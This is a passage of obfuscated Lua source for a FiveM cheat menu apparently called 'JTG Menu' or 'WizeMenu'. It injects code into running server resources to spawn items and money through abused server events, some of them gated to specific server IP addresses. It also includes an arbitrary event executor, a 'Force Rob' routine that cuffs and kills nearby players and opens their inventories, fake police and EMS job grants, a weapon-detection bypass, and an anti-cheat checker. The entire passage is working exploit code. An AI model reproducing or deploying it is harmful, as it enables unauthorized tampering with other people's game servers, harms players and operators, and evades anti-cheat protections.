        ]],v184));end break;end end end);InputBoxHandle=MachoMenuInputbox(v38[766 -(574 + 191) ],"Name:","...");InputBoxHandle2=MachoMenuInputbox(v38[1],"Amount:","...");MachoMenuButton(v38[1 + 0 ],"Spawn",function() local v185=MachoMenuGetInputbox(InputBoxHandle);local v186=MachoMenuGetInputbox(InputBoxHandle2);if (v185 and (v185~="") and v186 and tonumber(v186)) then local v253=tonumber(v186);local v254={ak47_drugmanager=function() MachoInjectResource2(7 -4 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function efjwr8sfr()
                        TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v185   .. [[", "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end

                    efjwr8sfr()
                ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(2 + 1 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function safdagwawe()
                        TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end

                    safdagwawe()
                ]] );end,["mc9-taco"]=function() MachoInjectResource2(852 -(254 + 595) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function cesfw33w245d()
                        TriggerServerEvent('mc9-taco:server:addItem', "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end

                    cesfw33w245d()
                ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function safdagwawe()
                        TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end

                    safdagwawe()
                ]] );end,["wp-pocketbikes"]=function() MachoInjectResource2(129 -(55 + 71) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function awdfaweawewaeawe()
                        TriggerServerEvent("wp-pocketbikes:server:AddItem", "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end

                    awdfaweawewaeawe()
                ]] );end,["solos-jointroll"]=function() MachoInjectResource2(3 -0 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function weawasfawfasfa()
                        TriggerServerEvent('solos-joints:server:itemadd', "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end

                    weawasfawfasfa()
                ]] );end,["angelicxs-CivilianJobs"]=function() MachoInjectResource2(1793 -(573 + 1217) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function safafawfaws()
                        TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end

                    safafawfaws()
                ]] );end,ars_whitewidow_v2=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function sDfjMawT34()
                        TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                            items = {
                                {
                                    id = "]]   .. v185   .. [[",
                                    image = "JTG",
                                    name = "JTG",
                                    page = 1,
                                    price = 500,
                                    quantity = ]]   .. v186   .. [[,
                                    stock = 999999999999999999999999999,
                                    totalPrice = 0
                                }
                            },
                            method = "cash",
                            total = 0
                        }, "cash")
                    end

                    sDfjMawT34()
                ]] );end,ars_cannabisstore_v2=function() MachoInjectResource2(8 -5 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                local function sDfjMawT34()
                    TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                        items = {
                            {
                                id = "]]   .. v185   .. [[",
                                image = "JTG",
                                name = "JTG",
                                page = JTG,
                                price = JTG,
                                quantity = ]]   .. v186   .. [[,
                                stock = JTG,
                                totalPrice = 0
                            }
                        },
                        method = "JTG",
                        total = 0
                    }, "cash")
                end

                sDfjMawT34()
                ]] );end,ars_hunting=function() MachoInjectResource2(1 + 2 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function sDfjMawT34()
                        TriggerServerEvent("ars_hunting:sellBuyItem",  {
                            item = "]]   .. v185   .. [[",
                            price = 1,
                            quantity = ]]   .. v186   .. [[,
                            buy = true
                        })
                    end

                    sDfjMawT34()
                ]] );end,["boii-whitewidow"]=function() local v265={"217.20.242.24:30120"};local function v266(v308) local v309=0 -0 ;while true do if (v309==(939 -(714 + 225))) then for v360,v361 in ipairs(v265) do if (v308==v361) then return true;end end return false;end end end local v267=GetCurrentServerEndpoint();if v266(v267) then MachoInjectResource2(8 -5 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent('boii-whitewidow:server:AddItem', ']]   .. v185   .. [[', ]]   .. v186   .. [[)
                        end

                        sDfjMawT34()
                    ]] );end end,["codewave-cannabis-cafe"]=function() local v268=0 -0 ;local v269;local v270;local v271;while true do if (v268==(1 + 0)) then function v270(v347) for v362,v363 in ipairs(v269) do if (v347==v363) then return true;end end return false;end v271=GetCurrentServerEndpoint();v268=2;end if (v268==0) then v269={"185.244.106.45:30120"};v270=nil;v268=1;end if (v268==2) then if v270(v271) then MachoInjectResource2(809 -(118 + 688) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "]]   .. v185   .. [[", newItem = "JTG", pricePerItem = 0 }, ]]   .. v186   .. [[)
                        end

                        sDfjMawT34()
                    ]] );end break;end end end,["snipe-boombox"]=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function sDfjMawT34()
                        TriggerServerEvent("snipe-boombox:server:pickup", ]]   .. v186   .. [[, vector3(0.0, 0.0, 0.0), "]]   .. v185   .. [[")
                    end

                    sDfjMawT34()
                ]] );end,devkit_bbq=function() MachoInjectResource2(51 -(25 + 23) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function sDfjMawT34()
                        TriggerServerEvent('devkit_bbq:addinv', ']]   .. v185   .. [[', ]]   .. v186   .. [[)
                    end

                    sDfjMawT34()
                ]] );end,mt_printers=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[  
                    local function sDfjMawT34()
                        TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:JTG", "]]   .. v185   .. [[", "add")
                    end

                    sDfjMawT34()
                ]] );end,WayTooCerti_3D_Printer=function() MachoInjectResource2(1 + 2 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[ 
                    local function ZxUwQsErTy12()
                        TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', ']]   .. v185   .. [[', ]]   .. v186   .. [[)
                    end
                    ZxUwQsErTy12()
                ]] );end,["pug-fishing"]=function() MachoInjectResource2(1889 -(927 + 959) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function MnBvCxZlKjHgFd23()
                        TriggerServerEvent('Pug:server:GiveFish', "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end
                    MnBvCxZlKjHgFd23()
                ]] );end,apex_koi=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function ErTyUiOpAsDfGh45()
                        TriggerServerEvent("apex_koi:client:addItem", "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end
                    ErTyUiOpAsDfGh45()
                ]] );end,apex_peckerwood=function() MachoInjectResource2(10 -7 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function UiOpAsDfGhJkLz67()
                        TriggerServerEvent("apex_peckerwood:client:addItem", "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end
                    UiOpAsDfGhJkLz67()
                ]] );end,apex_thetown=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function PlMnBvCxZaSdFg89()
                        TriggerServerEvent("apex_thetown:client:addItem", "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                    end
                    PlMnBvCxZaSdFg89()
                ]] );end,["codewave-bbq"]=function() MachoInjectResource2(735 -(16 + 716) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function QwErTyUiOpAsDf90()
                        for i = 1, ]]   .. v186   .. [[ do
                            TriggerServerEvent('placeProp:returnItem', "]]   .. v185   .. [[")
                            Wait(1)
                        end
                    end
                    QwErTyUiOpAsDf90()
                ]] );end,brutal_hunting=function() MachoInjectResource2(5 -2 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function TyUiOpAsDfGhJk01()
                        Wait(1)
                        TriggerServerEvent("brutal_hunting:server:AddItem", {
                            {
                                amount = "]]   .. v186   .. [[",
                                item = "]]   .. v185   .. [[",
                                label = "J",
                                price = 0
                            }
                        })
                    end
                    TyUiOpAsDfGhJk01()
                ]] );end,xmmx_bahamas=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function JkLzXcVbNmQwEr02()
                        TriggerServerEvent("xmmx-bahamas:Making:GetItem", "]]   .. v185   .. [[", {
                            amount = ]]   .. v186   .. [[,
                            cash = {
                            }
                        })
                    end
                    JkLzXcVbNmQwEr02()
                ]] );end,ak47_drugmanager=function() local v272=0;local v273;local v274;local v275;while true do if (v272==(97 -(11 + 86))) then v273={"162.222.16.18:30120"};v274=nil;v272=286 -(175 + 110) ;end if (v272==(2 -1)) then function v274(v348) for v364,v365 in ipairs(v273) do if (v348==v365) then return true;end end return false;end v275=GetCurrentServerEndpoint();v272=9 -7 ;end if ((1798 -(503 + 1293))==v272) then if v274(v275) then MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                        local function aKf48SlWd()
                            Wait(1)
                            TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v185   .. [[", "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                        end
                        aKf48SlWd()
                    ]] );end break;end end end,xmmx_letscookplus=function() MachoInjectResource2(3,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function QwErTy123()
                        Wait(1)
                        TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
                            totalCost = 0,
                            cart = {
                                {name = "]]   .. v185   .. [[", quantity = ]]   .. v186   .. [[}
                            }
                        }, "bank")
                    end
                    QwErTy123()
                ]] );end,["xmmx-letscamp"]=function() local v276=0 -0 ;local v277;local v278;local v279;while true do if (v276==(0 + 0)) then v277={"66.70.153.70:80"};v278=nil;v276=1;end if (1==v276) then function v278(v349) local v350=1061 -(810 + 251) ;while true do if (v350==(0 + 0)) then for v383,v384 in ipairs(v277) do if (v349==v384) then return true;end end return false;end end end v279=GetCurrentServerEndpoint();v276=2;end if (v276==(1 + 1)) then if  not v278(v279) then local v366=string.format([[ 
                        local function XcVbNm82()
                            Wait(1)
                            TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', ']]   .. v185   .. [[', {
                                ["%s"] = {
                                    ['lccampherbs'] = 0,
                                    ['lccampmeat'] = 0,
                                    ['lccampbutta'] = 0
                                },
                                ['amount'] = ]]   .. v186   .. [[
                            })
                        end
                        XcVbNm82()
                    ]] ,v185);MachoInjectResource2(3,"xmmx-letscamp",v366);end break;end end end,wasabi_mining=function() MachoInjectResource2(3 + 0 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                    local function MzXnJqKs88()
                        local item = {
                            difficulty = { "medium", "medium" },
                            item = "]]   .. v185   .. [[",
                            label = "JTG",
                            price = { 110, 140 }
                        }

                        local index = 3
                        local amount = ]]   .. v186   .. [[

                        for i = 1, amount do
                            Wait(1)
                            TriggerServerEvent('wasabi_mining:mineRock', item, index)
                        end
                    end
                    MzXnJqKs88()
                ]] );end,apex_bahama=function() local v280={"89.31.216.161:30120"};local function v281(v310) local v311=733 -(711 + 22) ;while true do if (v311==0) then for v367,v368 in ipairs(v280) do if (v310==v368) then return true;end end return false;end end end local v282=GetCurrentServerEndpoint();if v281(v282) then MachoInjectResource2(11 -8 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                        local function PlMnBv55()
                            Wait(1)
                            TriggerServerEvent("apex_bahama:client:addItem", "]]   .. v185   .. [[", ]]   .. v186   .. [[)
                        end
                        PlMnBv55()
                    ]] );end end,["jg-mechanic"]=function() local v283=859 -(240 + 619) ;local v284;local v285;local v286;while true do if (1==v283) then function v285(v351) for v369,v370 in ipairs(v284) do if (v351==v370) then return true;end end return false;end v286=GetCurrentServerEndpoint();v283=2;end if (v283==(1 + 1)) then if v285(v286) then MachoInjectResource2(4 -1 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                        local function HjKlYu89()
                            Wait(1)
                            TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v185   .. [[", 0, ]]   .. v186   .. [[, "autoexotic", 1)
                        end
                        HjKlYu89()
                    ]] );end break;end if (v283==(0 + 0)) then v284={"91.190.154.43:30120"};v285=nil;v283=406 -(255 + 150) ;end end end,["jg-mechanic"]=function() local v287=0 + 0 ;local v288;local v289;local v290;while true do if (v287==2) then if v289(v290) then MachoInjectResource2(2 + 1 ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                        local function LkJfQwOp78()
                            Wait(1)
                            TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v185   .. [[", 0, ]]   .. v186   .. [[, "TheCultMechShop", 1)
                        end
                        LkJfQwOp78()
                    ]] );end break;end if (v287==(0 -0)) then v288={"191.96.152.17:30121"};v289=nil;v287=1740 -(404 + 1335) ;end if (v287==1) then function v289(v352) for v371,v372 in ipairs(v288) do if (v352==v372) then return true;end end return false;end v290=GetCurrentServerEndpoint();v287=408 -(183 + 223) ;end end end};local v255=false;for v291,v292 in pairs(v254) do if (GetResourceState(v291)=="started") then v292();v255=true;break;end end if  not v255 then MachoMenuNotification("[NOTIFICATION] JTG Menu","No Triggers Found.");end else MachoMenuNotification("[NOTIFICATION] JTG Menu","Invalid Item or Amount.");end end);MoneyInputBox=MachoMenuInputbox(v38[2 -0 ],"Amount:","...");MachoMenuButton(v38[2],"Spawn",function() local v187=MachoMenuGetInputbox(MoneyInputBox);if (v187 and tonumber(v187)) then local v256=0 + 0 ;local v257;local v258;local v259;while true do if (1==v256) then v259=false;for v337,v338 in pairs(v258) do if (GetResourceState(v337)=="started") then v338();v259=true;break;end end v256=1 + 1 ;end if (2==v256) then if  not v259 then MachoMenuNotification("[NOTIFICATION] JTG Menu","No Triggers Found.");end break;end if (v256==(337 -(10 + 327))) then v257=tonumber(v187);v258={["codewave-lashes-phone"]=function() MachoInjectResource2(3,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardlashes', ]]   .. v257   .. [[)
                ]] );end,["codewave-nails-phone"]=function() MachoInjectResource2(3,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardnails', ]]   .. v257   .. [[)
                ]] );end,["codewave-caps-client-phone"]=function() MachoInjectResource2(3 + 0 ,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardCaps', ]]   .. v257   .. [[)
                ]] );end,["codewave-wigs-v3-phone"]=function() MachoInjectResource2(3,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardWigss', ]]   .. v257   .. [[)
                ]] );end,["codewave-icebox-phone"]=function() MachoInjectResource2(341 -(118 + 220) ,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardiceboxs', ]]   .. v257   .. [[)
                ]] );end,["codewave-sneaker-phone"]=function() MachoInjectResource2(1 + 2 ,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardShoes', ]]   .. v257   .. [[)
                ]] );end,["codewave-handbag-phone"]=function() MachoInjectResource2(452 -(108 + 341) ,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardhandbags', ]]   .. v257   .. [[)
                ]] );end};v256=1;end end else MachoMenuNotification("[NOTIFICATION] JTG Menu","Invalid Item or Amount.");end end);local v55=MachoMenuInputbox(v38[2 + 2 ],"Event:","...");local v56=MachoMenuInputbox(v38[4],"Type:","...");local v57=MachoMenuInputbox(v38[4],"Resource:","...");local v58={"monitor","any"};MachoMenuButton(v38[1497 -(711 + 782) ],"Execute",function() local v188=0 -0 ;local v189;local v190;local v191;local v192;local v193;local v194;local v195;local v196;local v197;local v198;local v199;local v200;local v201;local v202;local v203;while true do if (v188==(473 -(270 + 199))) then for v312,v313 in ipairs(v198) do table.insert(v200,v199(v313));end v201=(( #v200>0) and table.concat(v200,", ")) or "" ;v202=string.format([[
        local event = %q
        local triggerType = string.lower(%q)
        local args = { %s }

        if triggerType == "server" then
            TriggerServerEvent(event, table.unpack(args))
        else
            TriggerEvent(event, table.unpack(args))
        end
    ]],tostring(v197),string.lower(v190 or "client" ),v201);v203=nil;v188=2 + 3 ;end if (v188==1) then v192,v193=load("return function() return "   .. v189   .. " end" );if  not v192 then return;end v194,v195=pcall(v192);if ( not v194 or (type(v195)~="function")) then return;end v188=1821 -(580 + 1239) ;end if (v188==(5 -3)) then v196={pcall(v195)};if  not v196[1 + 0 ] then return;end v197=v196[2];v198={};v188=2 + 1 ;end if (v188==5) then if (v191 and (v191~="")) then if (GetResourceState(v191)=="started") then v203=v191;end else for v339,v340 in ipairs(v58) do if (GetResourceState(v340)=="started") then v203=v340;break;end end end if v203 then MachoInjectResource(v203,v202);end break;end if (v188==(0 -0)) then v189=MachoMenuGetInputbox(v55);v190=MachoMenuGetInputbox(v56);v191=MachoMenuGetInputbox(v57);if ( not v189 or (v189=="")) then return;end v188=1 + 0 ;end if (v188==(1170 -(645 + 522))) then for v314=3, #v196 do table.insert(v198,v196[v314]);end v199=nil;function v199(v315) if (type(v315)=="string") then return string.format("%q",v315);elseif ((type(v315)=="number") or (type(v315)=="boolean")) then return tostring(v315);elseif (type(v315)=="table") then local v381,v382=pcall(function() return json.encode(v315);end);return (v381 and string.format("json.decode(%q)",v382)) or "nil" ;else return "nil";end end v200={};v188=4;end end end);local v59=0;local v60={[0]={name="[E] Force Rob",resource=nil,code=nil}};MachoMenuDropDown(v38[1793 -(1010 + 780) ],"Exploit Choice",function(v204) v59=v204;end,v60[0 + 0 ].name);MachoMenuButton(v38[14 -11 ],"Execute",function() local v205=0 -0 ;local v206;while true do if (v205==(1836 -(1045 + 791))) then v206=v60[v59];if  not v206 then return;end v205=1;end if ((2 -1)==v205) then if (v59==0) then local v324=0 -0 ;local v325;local v326;local v327;while true do if ((507 -(351 + 154))==v324) then for v373,v374 in ipairs(v326 or {} ) do if (GetResourceState(v374)=="started") then MachoInjectResource2(1577 -(1281 + 293) ,v374,([[
                    local function awt72q48dsgn()
                        local awgfh347gedhs = CreateThread
                        awgfh347gedhs(function()
                            local dict = 'missminuteman_1ig_2'
                            local anim = 'handsup_enter'

                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do
                                Wait(0)
                            end

                            while true do
                                Wait(0)
                                if IsDisabledControlJustPressed(0, 38) then
                                    local selfPed = PlayerPedId()
                                    local selfCoords = GetEntityCoords(selfPed)
                                    local closestPlayer = -1
                                    local closestDistance = -1

                                    for _, player in ipairs(GetActivePlayers()) do
                                        local targetPed = GetPlayerPed(player)
                                        if targetPed ~= selfPed then
                                            local coords = GetEntityCoords(targetPed)
                                            local dist = #(selfCoords - coords)
                                            if closestDistance == -1 or dist < closestDistance then
                                                closestDistance = dist
                                                closestPlayer = player
                                            end
                                        end
                                    end

                                    if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                        local ped = GetPlayerPed(closestPlayer)

                                        local CEPressPlayer = SetEnableHandcuffs
                                        local CEDeadPlayerCheck = SetEntityHealth

                                        if not IsPedCuffed(ped) then
                                            CEPressPlayer(ped, true)
                                            CEDeadPlayerCheck(ped, 0)
                                            CEPressPlayer(ped, true)
                                        end

                                        if not IsEntityPlayingAnim(ped, dict, anim, 13) then
                                            TaskPlayAnim(ped, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                        end
                                        
                                        local ActiveInventory = "%s"
                                        local serverId = GetPlayerServerId(closestPlayer)
                                        if ActiveInventory == "ox" then
                                            TriggerEvent('ox_inventory:openInventory', 'otherplayer', serverId)
                                        elseif ActiveInventory == "qb" then
                                            TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', serverId)
                                        end
                                    end
                                end
                            end
                        end)
                    end

                    awt72q48dsgn()

                ]]):format(v325));break;end end break;end if ((266 -(28 + 238))==v324) then v325=nil;v326={"ox_inventory","ox_doorlock","ox_fuel","ox_target","ox_lib","ox_sit","ox_appearance"};v324=1 + 0 ;end if (v324==1) then v327={ox="ox_inventory",qb="qb-inventory"};for v375,v376 in pairs(v327) do if (GetResourceState(v376)=="started") then v325=v375;break;end end v324=1 + 1 ;end end else MachoInjectResource2(10 -7 ,v206.resource,v206.code);end break;end end end);MachoMenuButton(v39[1 + 0 ],"Gain VIP Access",function() if (ItemName and (ItemName~="") and ItemAmount and tonumber(ItemAmount)) then local v260=tonumber(ItemAmount);local v261={["qb-uwujob"]=function() MachoInjectResource2(473 -(381 + 89) ,(v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
                        local function aswdaw4atsdf()
                            TriggerServerEvent("qb-uwujob:addItem", "]]   .. ItemName   .. [[", ]]   .. ItemAmount   .. [[)
                        end

                        aswdaw4atsdf()
                    ]] );end};if (GetResourceState("qb-uwujob")=="started") then v261["qb-uwujob"]();else MachoMenuNotification("[NOTIFICATION] WizeMenu","qb-uwujob not started.");end else MachoMenuNotification("[NOTIFICATION] WizeMenu","Open Ticket In WizeMenu Discord.");end end);MachoMenuButton(v39[2 + 0 ],"Trigger Finder",function() local v207=0 + 0 ;while true do if (v207==0) then if  not HasValidKey() then return;end if SomeLicenseCheck() then local v328=0 -0 ;local v329;local v330;while true do if ((1157 -(1074 + 82))==v328) then for v377,v378 in pairs(v329) do if (GetResourceState(v377)=="started") then local v385=0;while true do if (v385==(0 -0)) then v378();v330=true;break;end end end end if  not v330 then MachoMenuNotification("[NOTIFICATION] JTG Menu","No Triggers Found.");end break;end if (v328==0) then v329={skirpz_drugplug=function() MachoInjectResource2(3,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                        local function fawfafffsfzxfzx()
                            XTYZ = CreateThread
                            XTYZ(function()
                                for i = 1, ]]   .. ItemAmount   .. [[ do
                                    local jtgdealer = "jtglol" .. math.random(1000,9999)
                                    JTG_TriggerServerEvent = TriggerServerEvent
                                    JTG_TriggerServerEvent('shop:purchaseItem', jtgdealer, ']]   .. ItemName   .. [[', 0)
                                    Wait(100)
                                end
                            end)
                        end
                        fawfafffsfzxfzx()
                    ]] );end,["solos-weedtable"]=function() MachoInjectResource2(1787 -(214 + 1570) ,(v41("ReaperV4") and "ReaperV4") or (v41("monitor") and "monitor") or "any" ,[[
                        local function aqrqtsgw32w523w()
                            local keyName = "solos-weed:server:itemadd"
                            TriggerServerEvent(keyName, "]]   .. ItemName   .. [[", ]]   .. ItemAmount   .. [[)
                        end
                        aqrqtsgw32w523w()
                    ]] );end};v330=false;v328=1456 -(990 + 465) ;end end else MachoMenuNotification("[NOTIFICATION] WizeMenu","Upgrade your license.");end break;end end end);MachoMenuButton(v39[1 + 1 ],"Police Job",function() local v208=0 + 0 ;while true do if (v208==(0 + 0)) then if  not HasValidKey() then return;end if v41("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end break;end end end);MachoMenuButton(v39[2],"EMS Job",function() local v209=0 -0 ;while true do if (v209==(1726 -(1668 + 58))) then if  not HasValidKey() then return;end if v41("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic" }
            CheckJob(job, true) 
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end break;end end end);MachoMenuButton(v39[629 -(512 + 114) ],"Spoofed Weapon Bypass",function() local v210=0;local v211;local v212;while true do if (v210==(2 -1)) then function v212() local v316=CreateThread;afwjawauw5sd(function() for v341=0,GetNumResources() -(1 -0)  do local v342=GetResourceByFindIndex(v341);if (v342 and (GetResourceState(v342)=="started")) then MachoInjectResource(v342,string.format([[
                         print("[ JTG ] - Resource Name: %s")
                         %s
                     ]],v342,v211));Wait(695 -495 );end end end);end break;end if (0==v210) then v211=[[
         _G.GetCurrentPedWeapon = function() return -1569615261 end
         _G.IsPedSwappingWeapon = function() return false end
         _G.GetSelectedPedWeapon = function() return -1569615261 end
         _G.GetWeapontypeGroup = function() return -1569615261 end
         _G.IsPedArmed = function() return false end
         _G.HasPedGotWeapon = function() return false end
         _G.IsPedShooting = function() return false end
         _G.WasPedShooting = function() return false end
         _G.RemoveAllPedWeapons = function() return false end
         _G.RemoveWeaponFromPed = function() return false end
         _G.IsPedDoingDriveby = function() return false end
         _G.IsPedSwitchingWeapon = function() return false end
         _G.GetBestPedWeapon = function() return -1569615261 end
         _G.GetAmmoInPedWeapon = function() return 0 end
         _G.GetPedAmmoTypeFromWeapon = function() return 0 end
         _G.GetCurrentPedWeaponEntityIndex = function() return -1 end
         _G.GetPedAmmoTypeFromWeapon_2 = function() return 0 end
         _G.GetWeapontypeModel = function() return -1569615261 end
         _G.GetEntityType = function() return 0 end
         _G.GetEntityAttachedTo = function() return false end
         _G.GetWeaponNameFromHash = function() return -1569615261 end
         _G.IsPedReloading = function() return false end
     ]];v212=nil;v210=1 + 0 ;end end end);MachoMenuButton(v40[1 + 0 ],"Uninject",function() local v213=0 + 0 ;while true do if (v213==0) then MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        Stopped = true
    ]]);MachoInjectResource((v41("core") and "core") or (v41("es_extended") and "es_extended") or (v41("qb-core") and "qb-core") or (v41("monitor") and "monitor") or "any" ,[[
        anvzBDyUbl = false
        if fLwYqKoXpRtB then fLwYqKoXpRtB() end
        kLpMnBvCxZqWeRt = false
    ]]);v213=1;end if ((3 -2)==v213) then MachoMenuDestroy(v13);break;end end end);MachoMenuCheckbox(v40[1996 -(109 + 1885) ],"RGB Menu",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if FmxmAlwkjfsfmaW == nil then FmxmAlwkjfsfmaW = false end
        FmxmAlwkjfsfmaW = true

        local function CreateRGBUI()
            local wfgsmWAEJKF = CreateThread
            wfgsmWAEJKF(function()
                local offset = 0.0
                while FmxmAlwkjfsfmaW and not Unloaded do
                    offset = offset + 0.065
                    local r = math.floor(127 + 127 * math.sin(offset))
                    local g = math.floor(127 + 127 * math.sin(offset + 2))
                    local b = math.floor(127 + 127 * math.sin(offset + 4))
                    MachoMenuSetAccent(MenuWindow, r, g, b)
                    Wait(25)
                end
            end)
        end

        CreateRGBUI()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        FmxmAlwkjfsfmaW = false
    ]]);end);local v61,v62,v63=207,16,32;MachoMenuSlider(v40[1471 -(1269 + 200) ],"R",v61,0,255,"",0,function(v214) local v215=0 -0 ;while true do if (v215==(815 -(98 + 717))) then v61=v214;MachoMenuSetAccent(v13,math.floor(v61),math.floor(v62),math.floor(v63));break;end end end);MachoMenuSlider(v40[828 -(802 + 24) ],"G",v62,0,439 -184 ,"",0 -0 ,function(v216) v62=v216;MachoMenuSetAccent(v13,math.floor(v61),math.floor(v62),math.floor(v63));end);MachoMenuSlider(v40[2],"B",v63,0 + 0 ,196 + 59 ,"",0,function(v217) v63=v217;MachoMenuSetAccent(v13,math.floor(v61),math.floor(v62),math.floor(v63));end);MachoMenuButton(v40[1 + 2 ],"Anti-Cheat Checker",function() local function v218(v234,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v234,...));end local function v219(v235,v236) local v237=0;local v238;while true do if (v237==0) then v238=LoadResourceFile(v235,v236);return v238~=nil ;end end end local v220=GetNumResources();local v221={{name="ai_module_fg-obfuscated.lua",acName="FiveGuard"}};for v239=0,v220-(2 -1)  do local v240=GetResourceByFindIndex(v239);local v241=string.lower(v240);for v262,v263 in ipairs(v221) do if v219(v240,v263.name) then local v317=0 -0 ;while true do if (v317==(1 + 0)) then return v240,v263.acName;end if (v317==(0 + 0)) then v218("Anti-Cheat: %s",v263.acName);AntiCheat=v263.acName;v317=1 + 0 ;end end end end local v242=nil;if (v241:sub(1 + 0 ,4 + 